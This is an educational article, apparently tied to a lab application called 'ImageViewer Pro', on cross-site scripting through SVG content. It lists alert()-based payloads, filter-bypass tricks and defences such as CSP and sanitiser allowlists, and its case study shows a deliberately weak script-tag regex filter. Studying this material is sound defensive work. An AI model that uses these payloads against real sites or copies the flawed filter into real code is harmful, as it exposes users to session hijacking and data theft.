# SVG-Based XSS Vulnerabilities

Scalable Vector Graphics (SVG) is an XML-based markup language for describing two-dimensional vector graphics. Unlike raster formats such as JPEG or PNG, SVG images can be scaled infinitely without losing quality, making them ideal for responsive web design and high-resolution displays.

Web applications that allow users to upload, generate, or input SVG content often do so to provide rich graphics capabilities. Common use cases include:

- Data visualization tools
- Diagram and flowchart editors
- Custom icon libraries
- Interactive graphics
- Design applications

## Security Concerns with SVG Input

While SVG provides powerful graphics capabilities, it also introduces significant security risks when user-provided SVG content is rendered without proper sanitization. SVG is fundamentally based on XML and can include:

1. **Executable JavaScript code** via various event handlers
2. **External resource loading** through links and references
3. **CSS manipulation** that can affect the entire page
4. **Complex interactions** with the DOM and browser environment

## SVG-Based XSS Attack Vectors

### 1. Event Handler Execution

SVG elements support numerous event handlers that can execute JavaScript:

```svg
<svg onload="alert('XSS')"></svg>
```

This simple example will execute the JavaScript code when the SVG element loads.

### 2. Script Elements within SVG

SVG allows embedding `<script>` elements directly:

```svg
<svg>
  <script type="text/javascript">
    alert('XSS via SVG script element');
  </script>
</svg>
```

### 3. Animation-Based Execution

SVG animation elements can trigger JavaScript:

```svg
<svg>
  <animate onbegin="alert('XSS')" attributeName="x" dur="1s" />
  <set onbegin="alert('XSS')" attributeName="y" to="10" />
</svg>
```

### 4. SVG Links and References

Links within SVG can use JavaScript URIs:

```svg
<svg>
  <a xlink:href="javascript:alert('XSS')">
    <text x="20" y="20">Click me for XSS</text>
  </a>
</svg>
```

### 5. Embedded HTML via foreignObject

SVG's `<foreignObject>` element can include HTML content:

```svg
<svg>
  <foreignObject>
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>alert('XSS via foreignObject')</script>
    </body>
  </foreignObject>
</svg>
```

### 6. CSS-Based Attacks

SVG can include style elements with CSS that may leak information:

```svg
<svg>
  <style>
    @import url("data:,*{background-image:url(javascript:alert('XSS'))}");
  </style>
</svg>
```

## Common Filtering Bypass Techniques

When websites attempt to filter SVG input, attackers often use these techniques to bypass security measures:

### 1. Case Sensitivity Exploitation

```svg
<svg ONload="alert('XSS')"></svg>
```

### 2. No Space Required in Event Handlers

```svg
<svg/onload="alert('XSS')"></svg>
```

### 3. Encoding Variations

```svg
<svg onload=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;></svg>
```

### 4. Nested Element Bypasses

```svg
<svg><g><a xlink:href="javascript:alert(1)"></a></g></svg>
```

### 5. Using Different Event Handlers

If `onload` is filtered, try other event handlers:
```svg
<svg onmouseover="alert('XSS')"></svg>
```

## Real-World Impact of SVG XSS

SVG-based XSS can lead to various security breaches:

1. **Session hijacking**: Attackers can steal user cookies and authenticate as the victim
2. **Credential theft**: Through phishing forms injected via XSS
3. **Sensitive data exfiltration**: Reading and transmitting page content
4. **Website defacement**: Modifying the visual appearance of the application
5. **Malware distribution**: Redirecting users to malicious downloads

## Secure Handling of SVG Input

To prevent SVG-based XSS attacks, applications should implement:

### 1. Content Security Policy (CSP)

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
```

### 2. SVG Sanitization Libraries

Use dedicated libraries designed to remove potentially malicious content from SVG:
- DOMPurify with SVG support enabled
- SVG-sanitize
- Ammonia (Rust-based)

### 3. Server-Side Validation

- Validate SVG structure and reject unexpected elements
- Use XML parsers that don't execute scripts
- Convert SVG to raster formats when possible (losing vector benefits)

### 4. SVG Feature Restriction

Restrict SVG to known-safe elements and attributes:
```javascript
const ALLOWED_SVG_ELEMENTS = ['svg', 'circle', 'rect', 'path', 'line', 'polyline', 'polygon', 'text', 'g'];
const ALLOWED_SVG_ATTRIBUTES = ['width', 'height', 'fill', 'stroke', 'stroke-width', 'x', 'y', 'cx', 'cy', 'r', 'd', 'points', 'transform'];
```

## Case Study: The ImageViewer Pro Vulnerability

In our example application, ImageViewer Pro allows users to input SVG code directly, with only minimal filtering that attempts to remove `<script>` tags but fails to address other attack vectors:

```javascript
// Vulnerable filtering - only removes script tags
const filtered = input.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '');
```

This filtering approach is inadequate because:

1. It doesn't block event handlers on SVG elements
2. It doesn't address `<use>` elements that can reference external resources
3. It doesn't prevent animation elements with event handlers
4. It doesn't catch `javascript:` URLs in links
5. It doesn't handle `<foreignObject>` elements

A real attacker can bypass this filtering with multiple techniques, as shown in our example payloads:

```svg
<svg onload=alert(1)>
<svg><set attributeName=x onbegin=alert(1)>
<svg><animate onend=alert(1) attributeName=x dur=1s>
```

## Conclusion

SVG-based XSS represents a significant security risk for applications that render user-provided SVG content. The complex nature of SVG, with its support for scripting, external resources, and rich interactivity, makes it a challenging attack surface to secure.

Application developers must implement comprehensive security controls including proper sanitization, content security policies, and feature restrictions to safely handle SVG input from untrusted sources.

## References

1. OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
2. HTML5 Security Cheatsheet: https://html5sec.org/
3. Content Security Policy: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
4. DOMPurify Documentation: https://github.com/cure53/DOMPurify
5. SVG Security: https://developer.mozilla.org/en-US/docs/Web/SVG/SVG_security